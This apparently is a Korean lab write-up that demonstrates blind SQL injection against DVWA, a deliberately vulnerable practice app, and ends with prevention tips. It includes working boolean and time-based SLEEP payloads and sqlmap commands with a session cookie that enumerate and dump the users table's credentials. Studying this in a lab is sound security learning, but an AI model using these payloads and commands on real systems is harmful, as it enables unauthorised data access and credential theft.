# Blind SQL Injection

- Blind SQL Injection은 SQL 쿼리 결과가 화면에 직접 출력되지 않는 상황에서 서버의 응답 차이(참/거짓, 시간 지연 등)를 이용해 데이터베이스 정보를 추론하는 기법입니다.
- 필자의 목표는 DVWA 환경에서 필자의 계정인 `admin`과 비밀번호 `test`를 Blind SQL Injection 기법으로 탈취하는 것입니다.

---

## 정상 동작 확인

- 다음은 DVWA의 Blind SQL Injection 실습 화면입니다.
- User ID 입력란에 1을 입력했을 때의 결과입니다.

![01](/Low/Blind%20SQL%20Injection/imgs/01.png)

- `User ID exists in the database`라는 문구가 출력되며 입력한 ID가 데이터베이스에 존재함을 알 수 있습니다.

- 다음으로 2를 입력해봅니다.

![02](/Low/Blind%20SQL%20Injection/imgs/02.png)

- `2` 역시 데이터베이스에 존재한다고 출력됩니다.

- 이번에는 `6`을 입력해봅니다.

![03](/Low/Blind%20SQL%20Injection/imgs/03.png)

- `User ID is MISSING from the database`라는 문구가 출력되며 ID `6`은 데이터베이스에 존재하지 않음을 알 수 있습니다.

---

## 사용자 입력 조작 확인

- 본격적으로 SQL Injection이 가능한지 확인하기 위해 다음과 같은 값을 입력해봅니다.

```text
2' or 1=1#
```
![04](/Low/Blind%20SQL%20Injection/imgs/04.png)

- `2`라는 ID가 존재한다는 메시지가 그대로 출력됩니다.
- 이는 사용자 입력값이 필터링 없이 SQL 쿼리에 포함되며 Injection 공격이 가능함을 의미합니다.

---

## Time-based Blind SQL Injection 확인

- 다음과 같은 페이로드를 입력합니다.

```text
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)#
```
- 이는 데이터베이스 이름의 첫 글자가 `d`라면 서버 응답을 3초 지연시키라는 의미입니다.

![06](/Low/Blind%20SQL%20Injection/imgs/06.png)

- Submit을 눌러보면 약 3초 후에 응답이 반환됩니다.
- 이를 통해 현재 데이터베이스 이름의 첫 글자가 `d`임을 알 수 있습니다.

---

## 조건 변경을 통한 거짓 판별

- 이번에는 데이터베이스 이름의 첫 글자가 b일 경우를 가정한 페이로드를 입력합니다.

```text
1' AND IF(SUBSTRING(database(),1,1)='b', SLEEP(3), 0)#
```
![07](/Low/Blind%20SQL%20Injection/imgs/07.png)

- 서버가 즉시 응답을 반환합니다.
- 따라서 데이터베이스 이름의 첫 글자는 b가 아님을 알 수 있습니다.

- 이처럼 서버의 응답 시간 차이를 이용해 조건의 참과 거짓을 판별하는 기법을 `Time-based Blind SQL Injection`이라고 합니다.

---

## Blind SQL Injection 기법

| 기법 이름 | 핵심 원리 | 판단 기준 | 예시 |
| --- | --- | --- | --- |
| Boolean-based Blind SQLi | 조건의 참/거짓에 따라 페이지 반응 변화 | 화면 내용 차이 | AND 1=1 / AND 1=2 |
| Time-based Blind SQLi | 조건이 참이면 응답 지연 발생 | 응답 시간 차이 | IF(조건, SLEEP(5), 0) |
| Error-based 유사 Blind | 에러 발생 여부로 조건 판단 | 에러 메시지 | CASE WHEN 조건 THEN 에러 |
| Out-of-band (OOB) | 외부 서버로 요청 유도 | 외부 요청 발생 | DNS 또는 HTTP 요청 |

---

## sqlmap을 이용한 자동화 공격

- Blind SQL Injection을 수동으로 수행하면 매우 많은 시간이 소요됩니다.
- 이를 자동화하기 위해 `sqlmap`이라는 도구를 사용합니다.

- sqlmap이 로그인된 사용자처럼 요청을 보내기 위해 세션 쿠키 값을 확인합니다.
- 브라우저 콘솔에서 다음 명령어를 실행합니다.

```text
document.cookie
```
![08](/Low/Blind%20SQL%20Injection/imgs/08.png)

- `PHPSESSID` 값을 확인할 수 있습니다.

---

## 데이터베이스 목록 조회

- 데이터베이스 목록을 조회하기 위해 다음 명령어를 사용합니다.

```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" --dbs
```
![09](/Low/Blind%20SQL%20Injection/imgs/09.png)

- sqlmap은 Boolean-based Blind SQL Injection이 가능하다고 판단합니다.
- 잠시 후 데이터베이스 목록이 출력됩니다.

![10](/Low/Blind%20SQL%20Injection/imgs/10.png)

- dvwa는 실제 사용자 정보가 저장된 데이터베이스입니다.
- information_schema는 MySQL 시스템 메타데이터 데이터베이스입니다.

---

## 테이블 목록 조회

- dvwa 데이터베이스의 테이블 목록을 조회합니다.

```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa --tables
```
![11](/Low/Blind%20SQL%20Injection/imgs/11.png)

![12](/Low/Blind%20SQL%20Injection/imgs/12.png)

- `users` 테이블에 계정 정보가 존재할 가능성이 높습니다.

---

## 컬럼 목록 조회

- `users` 테이블의 컬럼을 조회합니다.

```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa -T users --columns
```
![13](/Low/Blind%20SQL%20Injection/imgs/13.png)

![14](/Low/Blind%20SQL%20Injection/imgs/14.png)

---

## 사용자 계정 정보 탈취

- `user`와 `password` 컬럼의 값을 추출합니다.

```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa -T users -C user,password --dump
```
![15](/Low/Blind%20SQL%20Injection/imgs/15.png)

- user명과 password가 추출되며, password는 해시 값으로 저장되어 있으며 sqlmap이 해당 해시의 원문 문자열도 함께 출력합니다.

![16](/Low/Blind%20SQL%20Injection/imgs/16.png)


---

## 최종 결과

- 계정: admin
- 비밀번호: test

- 이를 통해 Blind SQL Injection을 이용해 데이터베이스 정보 추론부터 계정 정보 탈취까지 가능함을 확인하였습니다.

---

## Blind SQL Injection 예방법

- Prepared Statement 사용으로 SQL 구조와 입력값 분리
- 입력값 검증을 통해 예상 범위 외 값 차단
- DB 계정 권한 최소화
- 에러 메시지를 사용자에게 직접 노출하지 않기
